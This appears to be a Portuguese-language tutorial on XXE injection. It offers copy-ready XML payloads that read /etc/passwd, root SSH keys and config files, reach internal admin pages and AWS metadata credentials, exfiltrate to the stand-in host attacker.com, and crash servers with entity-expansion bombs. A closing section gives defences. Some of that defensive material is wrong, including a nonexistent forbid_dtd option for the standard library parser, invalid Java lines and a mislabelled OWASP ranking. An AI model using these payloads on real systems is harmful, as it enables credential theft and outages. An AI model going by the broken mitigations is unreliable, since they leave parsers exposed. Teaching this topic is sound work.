# XXE Injection (XML External Entity)

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 8.6 (Alto) |
| **OWASP Top 10** | #5 - Broken Access Control |
| **CWE** | CWE-611 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | LFI, SSRF, DoS, RCE |

---

## 🔍 O que é XXE Injection?

XXE (XML External Entity) é uma vulnerabilidade que permite explorar a forma como parsers XML processam entidades externas. A especificação XML contém recursos potencialmente perigosos que, se não desabilitados, permitem:

- **Local File Inclusion (LFI)** - Leitura de `/etc/passwd`, configurações, código-fonte
- **SSRF Attacks** - Acesso a serviços internos
- **Denial of Service** - Ataques XXE Billion Laughs
- **Remote Code Execution** - Em casos raros com processamento pós-XXE

---

## 💥 Exemplos Práticos de Exploração

### 1. **XXE Básica - Leitura de Arquivo**

**Cenário:** Aplicação processa XML de compra

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

**Payload - Ler /etc/passwd:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Resposta:**
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 2. **XXE - Leitura de Arquivo Privado**

**Ler chave SSH:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> 
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Ler arquivo de configuração:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> 
]>
<data>&xxe;</data>
```

### 3. **XXE para SSRF - Acesso a Admin Local**

**Cenário:** Admin page só acessível localmente (127.0.0.1)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY xxe SYSTEM "http://127.0.0.1/admin"> 
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Resposta:** Conteúdo da página admin (sem estar autenticado via navegador)

### 4. **XXE para SSRF - Acesso a Serviços Internos**

**Ler serviço interno na porta 8080:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY xxe SYSTEM "http://localhost:8080/api/users"> 
]>
<data>&xxe;</data>
```

**Acesso a cloud metadata (AWS):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> 
]>
<data>&xxe;</data>
```

### 5. **Blind XXE - Exfiltração via DNS**

**Cenário:** Aplicação não retorna o arquivo diretamente

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.com/?data=test">
]>
<data>&xxe;</data>
```

**Ou com parameter entity:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
    %eval;
]>
<data>&exfiltrate;</data>
```

### 6. **XXE Billion Laughs (DoS)**

**Payload - Consumir memória:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

**Resultado:** Exponential memory expansion → Crash do servidor

### 7. **Quadratic Blowup Attack**

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
]>
<bomb>
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
</bomb>
```

### 8. **XXE em SOAP (Web Services)**

**Request SOAP vulnerável:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <getUserDetails>
      <username>&xxe;</username>
    </getUserDetails>
  </soap:Body>
</soap:Envelope>
```

---

## 🛡️ Contramedidas e Prevenção

### 1. **Desabilitar DTD Processing (Recomendado)**

```python
# Python - lxml
from lxml import etree

parser = etree.XMLParser(remove_blank_text=True, resolve_entities=False)
tree = etree.fromstring(xml_data, parser=parser)

# Python - xml.etree
import xml.etree.ElementTree as ET
ET.XMLParser(target=ET.TreeBuilder(), forbid_dtd=True)
```

### 2. **Desabilitar External Entities**

```python
# Python - xml.dom.minidom
import xml.dom.minidom
parser = xml.dom.minidom.parseString(xml_data)
# Defaut: entities são desabilitadas

# Java
XMLConstants.ACCESS_EXTERNAL_DTD = ""
XMLConstants.ACCESS_EXTERNAL_SCHEMA = ""

# PHP
libxml_disable_entity_loader(true);
```

### 3. **Usar Bibliotecas Seguras**

```python
# ✅ Seguro
from defusedxml.ElementTree import parse as safe_parse
tree = safe_parse(file_obj)

# Defusedxml desabilita:
# - Resolução de entidades externas
# - Billion Laughs
# - Quadratic blowup
```

### 4. **Validar e Sanitizar XML**

```python
import re
from defusedxml import ElementTree as ET

def safe_parse_xml(xml_data):
    # Rejeitar DOCTYPE
    if '<!DOCTYPE' in xml_data or '<!ENTITY' in xml_data:
        raise ValueError("DOCTYPE/ENTITY detectados")
    
    parser = ET.XMLParser()
    return ET.fromstring(xml_data, parser=parser)
```

### 5. **Usar JSON em vez de XML**

```python
# ❌ Vulnerável a XXE
data = parse_xml(request.data)

# ✅ JSON é seguro de XXE
import json
data = json.loads(request.data)
```

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/xxe |
| OWASP XXE | https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing |
| HackTricks XXE | https://book.hacktricks.xyz/pentesting-web/xxe-xeml-external-entity |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection |
| CWE-611 | https://cwe.mitre.org/data/definitions/611.html |
| Defusedxml | https://github.com/tiran/defusedxml |

---

**Última atualização:** Agosto 2026
